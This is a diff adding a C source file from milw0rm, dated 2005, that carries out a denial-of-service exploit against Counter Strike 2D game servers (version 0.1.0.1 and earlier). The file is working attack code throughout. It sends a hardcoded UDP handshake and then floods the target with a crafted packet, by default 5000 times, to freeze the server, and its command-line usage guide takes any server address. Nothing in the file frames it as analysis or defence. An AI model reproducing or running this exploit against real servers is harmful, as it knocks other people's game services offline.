@@ -1,0 +1,126 @@
+/*
+  Counter Strike 2D DoS
+  Affected versions: 0.1.0.1 and prior
+  CS2D Developer: http://www.cs2d.com/
+
+  by Iman Karim (iman.karim@smail.inf.fh-bonn-rhein-sieg.de)
+  http://home.inf.fh-rhein-sieg.de/~ikarim2s/
+
+  Written in Borland C++ Builder 6
+  20.09.2005
+*/
+#include <winsock.h>
+#include <stdio.h>
+#include <conio.h>
+int sd;
+int port = 36963;
+WSADATA wsadata;
+struct  sockaddr_in p;
+
+const static unsigned char MakeCon[]=   "\xFA\xFA\x0D\x0A"
+                                        "\x68\x61\x72\x72\x79" //Player Name = Harry (in Hex)
+                                        "\xCE\x7B\xE2\x45\x63\x90\x00\x00";
+const static unsigned char DoSPack[]=   "\xFA\x04"
+                                        "\x68\x61\x72\x72\x79" //Player Name again
+                                        "\x0D\x0A\x02" ;
+
+//----------------------------------------------------------------------
+u_int resolveaddr(char  *host )
+{
+    u_int ip;
+    struct hostent *hIP ;
+
+    ip = inet_addr(host);
+       hIP = gethostbyname(host);
+        if(!hIP) {
+            printf("Cant solve hostip => quitting...\n");
+            return(0);
+        }
+        else ip = *(u_int *)hIP->h_addr;
+    return(ip);
+}
+
+
+
+bool HandShake(int sd)
+{
+        sendto(sd, MakeCon, 22, 0,(struct sockaddr *)&p, sizeof(p));
+        return true;
+}
+
+bool DoSAttack(int sd)
+{
+        sendto(sd, DoSPack, 10, 0, (struct sockaddr *)&p, sizeof(p));
+        return true;
+}
+//----------------------------------------------------------------------
+
+
+
+int main(int argc, char *argv[])
+{
+        printf ("Counter Strike 2D DoS\n");
+        printf ("Affected versions: 0.1.0.1 and prior\n");
+        printf ("by Iman Karim (iman.karim@smail.inf.fh-bonn-rhein-sieg.de)\n");
+        printf ("http://home.inf.fh-rhein-sieg.de/~ikarim2s/\n-----------\n");
+        if (argc <= 1)
+        {
+                printf ("\n-Quick Guide-\n\n");
+                printf ("%s <SRV_IP> [SRV_PORT] [PACKET_COUNT]\n",argv[0]);
+                printf ("Default Port is 36963\n");
+                printf ("Default Packet Count is 5000\n");
+                printf ("\n-           -\n\nPress a key...");
+                getch();
+                printf ("\n");
+                return(0);
+        }
+
+        WSAStartup(MAKEWORD (1,0), &wsadata);
+        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+
+        if(sd < 0)
+        {
+         printf ("Cant create socket => quitting...\n");
+         return(0);
+        }
+
+        if(argc > 2) port = atoi(argv[2]);
+
+        p.sin_addr.s_addr = resolveaddr(argv[1]);
+        p.sin_port        = htons(port);
+        p.sin_family      = AF_INET;
+
+        printf ("Attacking %s:%i...\n",argv[1],port);
+        printf ("+Attack started...\n");
+
+        printf ("++Sending Handshake...\n");
+        HandShake(sd);
+        unsigned char   rbuf[1024];
+        ZeroMemory(rbuf, 1024);
+        int cnt=0;
+
+        int pcount = 5000;
+        if(argc > 2) pcount = atoi(argv[3]);
+        printf("\n\n[!!!] IF THE SERVER DON'T RESPONSE PRESS CTRL+C [!!!]\n\n");
+        for(int i=0;i<=pcount;i++){
+                printf("+++Sending packet nr.%i...\n",i);
+                int len=recvfrom(sd, rbuf, sizeof(rbuf), 0, NULL, NULL);
+                if (len > 0)
+                {
+                        printf("+++(%i)Server Responsed\n",i);
+                        printf("+++(%i)Sending DoS Packet\n",i);
+                        DoSAttack(sd);
+                }
+
+        }
+
+        printf("++Attack Done!\n");
+        printf("+Server should be frozen...\n");
+        printf("Done => quitting.\npress any key...\n");
+
+        getch();
+        return 0;
+
+}
+
+// milw0rm.com [2005-12-11]
